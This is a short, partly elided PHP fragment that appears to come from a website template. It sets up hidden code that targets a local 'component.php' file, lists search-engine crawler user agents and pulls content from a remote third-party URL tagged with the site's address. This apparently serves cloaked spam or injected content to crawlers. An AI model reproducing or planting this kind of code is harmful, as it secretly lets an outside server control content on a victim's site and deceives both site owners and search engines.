<?php
	...
	$target = dirname(__FILE__) . DIRECTORY_SEPARATOR . "component.php"; $cachetime = 2 * 24 * 60 * 60; //2 * 24 * 60 * 60
	$access = array('Googlebot','Yahoo','msnbot','Googlebot-Mobile'); $source = "http://aztemplates.com/b/je.php?site=".$url;
